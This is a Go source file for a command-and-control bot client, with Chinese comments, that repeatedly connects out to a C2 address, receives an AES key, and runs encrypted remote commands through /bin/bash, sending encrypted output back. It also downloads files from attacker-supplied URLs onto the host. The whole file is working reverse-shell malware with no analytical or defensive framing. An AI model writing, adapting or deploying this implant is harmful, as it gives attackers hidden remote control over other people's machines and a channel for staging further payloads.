package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	chanQuit = make(chan bool, 0)
	conn     net.Conn
)

const buf = 1024


//TODO:报错
func CHandleError(err error, why string) {
	if err != nil {
		fmt.Println(why, err)
	}
}

//TODO:随机数生成
func genNumStr(len int) string {

	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

//TODO:加密算法
func encryptDog(encrypt bool, key []byte, message string) (result string) {
	/*
		加密函数是直接copy来的。
		encypt为true加密，false解密
		key是动态密钥
		message是内容
	*/
	if encrypt {
		plainText := []byte(message)
		block, _ := aes.NewCipher(key)
		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
		result = base64.URLEncoding.EncodeToString(cipherText)
	} else {
		cipherText, _ := base64.URLEncoding.DecodeString(message)
		block, _ := aes.NewCipher(key)
		iv := cipherText[:aes.BlockSize]
		cipherText = cipherText[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(cipherText, cipherText)
		result = string(cipherText)
	}

	return
}

//TODO:文件下载
func download(command string) error {

	command = strings.ReplaceAll(strings.ReplaceAll(command, "\r", ""), "\n", "")
	var URL = ""
	var fileName = ""
	URL = strings.Split(strings.ReplaceAll(command, "download ", ""), " ")[0]
	fileName = strings.Split(strings.ReplaceAll(command, "download ", ""), " ")[1]

	r, err := http.Get(URL)
	if err != nil {
		return err
	}
	defer r.Body.Close()
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(fileName, data, 0644)
	if err != nil {
		return err
	}
	return nil
}

//TODO:shell相关流程
func goShell(conn net.Conn, keyStr string) bool {

	key := []byte(keyStr)
	var cmd_buf []byte
	cmd_buf = make([]byte, buf)
	for {
		receivedBytes, err := conn.Read(cmd_buf[0:])
		if err != nil {
			break
		}
		enc_command := string(cmd_buf[0:receivedBytes])
		byte_command := encryptDog(false, key, enc_command)
		command := string(byte_command)
		if strings.Index(command, "stop") == 0 {
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "cd") == 0 {
			dir := strings.TrimSuffix(command[3:], "\r\n")
			os.Chdir(string(dir))
		} else if strings.HasPrefix(command, "download") {

			go download(command)
			enc_cmdout := encryptDog(true, key, "downloading...")
			output := string(enc_cmdout) + "\n"
			conn.Write([]byte(output))

		} else {
			shell_arg := []string{"-c", command}
			execcmd := exec.Command("/bin/bash", shell_arg...)
			cmdout, _ := execcmd.Output()
			fmt.Println(string(cmdout))
			enc_cmdout := encryptDog(true, key, string(cmdout))
			output := string(enc_cmdout) + "\n"
			conn.Write([]byte(output))
		}
	}
	return false
}

//TODO:入口
func main() {

	var (
		botNum  = ""
		ip_port = "127.0.0.1:55555"
	)

	if len(os.Args) > 1 {
		fmt.Println(os.Args[1])
		ip_port = string(os.Args[1])
	}

	buffer := make([]byte, 1024)

	botNum = genNumStr(4)

	for {
		//连接c2,发送握手包
		conn, err := net.Dial("tcp", ip_port)

		if err == nil {
			conn.Write([]byte(botNum))
			n, err := conn.Read(buffer)
			if err != nil {
				time.Sleep(5 * time.Second)
			} else {
				if n > 0 {
					//获取密钥
					keyStr := string(buffer[:n])
					//fmt.Println(keyStr)
					if len(keyStr) > 0 {
						//进入shell执行流程
						goShell(conn, keyStr)
					} else {
						time.Sleep(5 * time.Second)
					}
				}
			}
		} else {
			time.Sleep(10 * time.Second)
		}
	}

	//设置优雅退出逻辑
	<-chanQuit
}
